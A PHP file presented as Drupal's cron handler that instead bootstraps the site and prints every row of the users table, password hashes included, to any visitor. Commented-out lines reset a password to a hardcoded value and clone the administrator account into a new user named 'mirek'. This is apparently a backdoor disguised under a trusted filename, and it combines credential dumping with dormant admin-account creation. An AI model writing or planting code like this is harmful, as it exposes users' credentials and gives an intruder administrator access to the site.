<?php

/**
 * @file
 * Handles incoming requests to fire off regularly-scheduled tasks (cron jobs).
 */

/**
 * Root directory of Drupal installation.
 */
define('DRUPAL_ROOT', getcwd());

include_once DRUPAL_ROOT . '/includes/bootstrap.inc';
include_once DRUPAL_ROOT . '/includes/password.inc';


drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);

//db_query("UPDATE {users} SET password = '".user_hash_password("m0l0k0!")."' WHERE username = 'mirek'");

/*$user = user_load(1);
$user->name = "mirek";
$user->is_new = true;
$user->uid = NULL;
$user->pass = user_hash_password("m0l0k0!");
$user->mail = "mirek@mata.wellesley.edu";
user_save($user);*/

$db = db_query("SELECT * FROM {users}");
foreach($db as $userbek){
	print_r($userbek);
}